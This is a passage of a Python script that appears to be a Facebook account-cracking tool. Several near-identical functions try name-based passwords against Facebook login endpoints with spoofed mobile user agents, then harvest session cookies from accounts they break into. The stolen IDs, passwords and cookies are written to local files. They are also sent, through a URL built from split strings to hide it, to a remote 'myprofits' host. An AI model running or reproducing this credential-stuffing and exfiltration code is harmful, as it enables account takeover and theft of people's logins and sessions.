            'referer': f'https://{fb}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980'}
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(response.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(response.text)).group(1),
            'uid': uid,
            'next': f'https://{fb}/login/save-device/',
            'flow': 'login_no_pin',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)}
            response = ses.post(f'https://{fb}/login/device-based/validate-password/?shbl=0',cookies=cookie,headers=headers2,data=data,allow_redirects=False)
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)



            

def filemeth11(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    fb=mas.domain(qw)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.iPhone_user_agent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            headers = {
            'authority': fb,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980',}
            response = ses.get(f'https://{fb}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr',headers=headers)
            cookie = dict(ses.cookies.get_dict())
            headers2 = {
            'authority': fb,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '3',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980'}
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(response.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(response.text)).group(1),
            'uid': uid,
            'next': f'https://{fb}/login/save-device/',
            'flow': 'login_no_pin',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)}
            response = ses.post(f'https://{fb}/login/device-based/validate-password/?shbl=0',cookies=cookie,headers=headers2,data=data,allow_redirects=False)
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)







def filemeth12(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    fb=mas.domain(qw)
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.MXuseragent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = ses.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            ses.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        



def filemeth13(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    fb=mas.domain(qw)
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.redmi_user_agent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = ses.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            ses.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


 


def filemeth14(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    fb=mas.domain(qw)
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.iPhone_user_agent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = ses.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            ses.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        

def filemeth15(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    fb=mas.domain(qw)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.windows_user_agent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
